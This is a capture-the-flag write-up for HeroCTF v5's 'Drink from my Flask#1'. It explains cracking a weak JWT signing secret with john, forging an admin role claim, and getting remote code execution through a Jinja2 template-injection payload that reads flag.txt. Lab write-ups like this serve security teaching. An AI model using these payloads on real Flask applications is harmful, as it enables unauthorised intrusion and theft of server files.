# Drink from my Flask#1

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- 87 solves / 168 points
- Difficulty: Medium
- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

A friend of yours got into an argument with a flask developer. He tried handling it himself, but he somehow got his nose broken in the process... Can you put your hacker skills to good use and help him out?  
  
You should probably be able to access the server hosting your target's last project, shouldn't you ? I heard is making a lost of programming mistakes...  
  
> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)  
  
Format : **Hero{flag}**  
Author : **Log_s**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513185709.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513185720.png)

In here, we need to supply `op`, `n1`, `n2` GET parameters, otherwise it'll return "Invalid operation".

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513185901.png)

When we go to `/`, it'll set a new cookie called `token`, and it's a JWT (JSON Web Token).

> Note: It's highlighted in green is because of the "JSON Web Tokens" extension in Burp Suite. 

**JWT Decoded:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513190019.png)

As you can see, it's using algorithm HS256, which is HMAC + SHA256. In the payload section, **it has a `role` claim, it's currently set to `guest`.**

**Hmm... Since HS256 is a symmetric signing key algorithm, we can try to brute force the signing secret.**

**To do so, I'll use `john`:**
```shell
┌[siunam♥earth]-(~/ctf/HeroCTF-v5/Web/Drink-from-my-Flask#1)-[2023.05.13|19:06:17(HKT)]
└> john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
[...]
key              (?)     
[...]
```

**Nice!! We successfully cracked the signing secret: `key`!!**

Now, we can sign our modified JWT via [jwt.io](https://jwt.io/)!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513191014.png)

But what value should we modify in the `role` claim?

Hmm... Don't know yet.

**Let's try to provide `op`, `n1`, `n2` GET parameters in `/`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513191526.png)

Maybe we can do command injection??

But nope, I tried.

**Then, I try to go to a non-existance page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513192018.png)

And oh! We found the admin page!

**We now shouldn't able to visit the admin page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513192042.png)

**Now, as the JWT signing secret was found, let's modify the `role` claim to `admin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513192146.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513192212.png)

Umm... What? Just that?

**In those 404 page and `/adminPage`, it's vulnerable to reflected XSS:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513192718.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513192805.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513192753.png)

However, those aren't useful for us... Our goal should be finding sever-side vulnerability...

**I also noticed this weird error:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513193501.png)

> "Anormaly long payload"

After poking around, I have no idea what should I do...

Ah! Wait, how do the 404 page is rendered?

**You guess, Flask is using a template engine called "Jinja2":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513211612.png)

Nice! We can try to gain Remote Code Execution (RCE) via Server-Side Template Injection (SSTI)!

## Exploitation

**According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#rce-escaping), we could gain RCE via the following payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513211927.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513211933.png)

Ahh... I now know why the "Anormaly long payload" exist...

```shell
┌[siunam♥earth]-(~/ctf/HeroCTF-v5/Web/Drink-from-my-Flask#1)-[2023.05.13|21:20:45(HKT)]
└> curl http://dyn-04.heroctf.fr:12369/$(python3 -c "print('A' * 34)")
<h2>/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA was not found</h2><br><p>Only routes / and /adminPage are available</p>                                                                                                       ┌[siunam♥earth]-(~/ctf/HeroCTF-v5/Web/Drink-from-my-Flask#1)-[2023.05.13|21:20:47(HKT)]
└> curl http://dyn-04.heroctf.fr:12369/$(python3 -c "print('A' * 35)")
Anormaly long payload
```

As you can see, the path is limited to 34 characters.

**So... We need to craft a SSTI payload that less than 35 characters.**

**To bypass that, we can **use the `config` object instance in Flask.** This object instance stores the server's configuration:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513213012.png)

**In that object instance, it has a method called `update`, which add/update an attribute in that object instance:**
```python
config.update(key=value)
```

That being said, we can use the `update()` method to save some characters!

However, I don't wanna go that route!

**Do you still remember we have reflected XSS in `/adminPage` with the JWT's `role` claim?**

**Does it have any character limit AND vulnerable to SSTI?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513220228.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513220235.png)

Nice!! That `/adminPage` doesn't have any character limit!

**Let's try to gain RCE again:**
```
\{\{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -lah').read() \}\}
```

> Note: Once again, the above payload is from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python) 

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513220657.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513220703.png)

**Let's read the flag!!**
```
\{\{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() \}\}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513220758.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513220810.png)

- **Flag: `Hero{sst1_fl4v0ur3d_c0Ok1e}`**

## Conclusion

What we've learned:

1. Cracking JWT Secret & Exploiting RCE Via SSTI